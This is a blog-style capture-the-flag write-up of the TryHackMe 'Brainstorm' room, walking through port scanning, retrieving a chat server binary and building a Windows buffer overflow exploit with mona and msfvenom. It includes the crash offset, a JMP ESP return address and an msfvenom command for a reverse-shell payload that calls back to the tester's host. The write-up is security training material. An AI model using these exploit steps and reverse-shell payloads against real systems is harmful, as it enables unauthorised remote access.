---
layout: post
title:  "TryHackMe Brainstorm writeup"
date:   2020-12-02 12:59:36 +0200
categories: writeup tryhackme
---

This is a writeup for TryHackMe room [Brainstorm](https://tryhackme.com/room/brainstorm). 

## Reconnaissance

Start with nmap scan, but need to disable host discovery.

```
nmap -Pn -p- 10.10.235.126
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 17:21 EET
Nmap scan report for 10.10.235.126
Host is up (0.053s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
3389/tcp open  ms-wbt-server
9999/tcp open  abyss
Nmap done: 1 IP address (1 host up) scanned in 106.02 seconds
```
Don’t know where the six ports that is accepted as answer comes from. But the format here is pretty clear: FTP server has a copy of an executable that is running on port 9999 and by analyzing it an exploit can be created.

## FTP Enumeration
Get the chatserver binaries chatserver.exe and essfunc.dll from the ftp service for analysis.

## Testing chat server
Test the server to see what it looks like.
```bash
nc 10.10.235.126 9999     
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): foo
Write a message: hello
Wed Dec 02 07:22:35 2020
foo said: hello
Write a message:  foo
Wed Dec 02 07:22:38 2020
foo said: foo
Write a message:  ^C
```
# Gaining entry
Open binary in Immunity Debugger. Configure mona:
```
!mona config -set workingfolder c:\mona\%p
```
Create a buffer that crashes the program:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```
Feed it to the write a message (paste) and crash. Check with mona EIP:

![mona]({{ site.url }}/assets/brainstorm/mona.png)
Ok, offset seems to be 2012. Verify by sending a payload:
```
offset = 2012
overflow = “A” * offset
retn = “BBBB
```
The program crashes and EIP is what it should be:

![mona]({{ site.url }}/assets/brainstorm/stack.png)

Check for badchars by using badchars array as payload:
```
!mona compare -f c:\mona\brainpan\bytearray.bin -a 006CEEB8
```
No badchars makes life easy. Now for the jump address:

!mona jmp -r esp -cpb “\x00”

![mona]({{ site.url }}/assets/brainstorm/badchars.png)
`\xdf\x14\x50\62` is what we can use as return address (reverse order in payload). It is in the DLL without ASLR which is good. Generate a payload and copy the bytes into the exploit buffer:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.108.247 LPORT=4444 EXITFUNC=thread -b “\x00” -f py
```
Here is the final exploit:
{% gist 24e87e0ab52208efb6c8da4c0275a34b %}

Run the exploit for reverse root shell.
